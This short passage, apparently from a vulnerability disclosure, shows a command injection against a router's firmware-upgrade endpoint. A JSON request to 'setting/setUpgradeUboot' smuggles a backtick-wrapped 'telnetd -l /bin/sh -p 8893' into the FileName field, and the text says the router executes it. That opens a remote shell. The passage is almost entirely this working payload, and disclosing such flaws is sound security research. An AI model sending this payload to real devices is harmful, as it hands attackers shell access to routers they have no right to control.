...
We set `FileName` as **`telnetd -l /bin/sh -p 8893`** , and the router will excute it,such as:
...
{"topicurl":"setting/setUpgradeUboot","FileName":"`telnetd -l /bin/sh -p 8893`","ContentLength":"10000"}
```
